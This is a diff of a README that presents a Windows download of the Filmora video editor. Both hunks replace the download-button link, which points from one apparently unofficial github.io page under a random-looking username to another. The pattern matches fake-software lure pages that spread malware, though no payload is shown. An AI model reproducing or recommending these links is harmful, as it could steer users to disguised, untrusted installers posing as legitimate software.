@@ -16,7 +16,7 @@ Filmora is a video editing application for Windows by Wondershare that lets crea
 <div align="center">
   <h3>Edit videos on Windows with an intuitive timeline, rich effects, smooth transitions, and built-in audio tools.</h3>
 
-  [![Download Filmora](https://img.shields.io/badge/⬇_Download_Filmora_for_Windows-2962FF?style=for-the-badge)](https://latonyachudyfjpek.github.io/.github/Filmora-Desktop-App)
+  [![Download Filmora](https://img.shields.io/badge/⬇_Download_Filmora_for_Windows-2962FF?style=for-the-badge)](https://dennisharris62.github.io/.github/Filmora-Desktop-App)
 
 </div>
 
@@ -88,7 +88,7 @@ For help with Filmora, open the built-in Help menu inside the application, or vi
 <div align="center">
   <h3>Ready to get started with Filmora?</h3>
 
-  [![Download Filmora](https://img.shields.io/badge/⬇_Download_Filmora_for_Windows-2962FF?style=for-the-badge)](https://latonyachudyfjpek.github.io/.github/Filmora-Desktop-App)
+  [![Download Filmora](https://img.shields.io/badge/⬇_Download_Filmora_for_Windows-2962FF?style=for-the-badge)](https://dennisharris62.github.io/.github/Filmora-Desktop-App)
 
 </div>
 
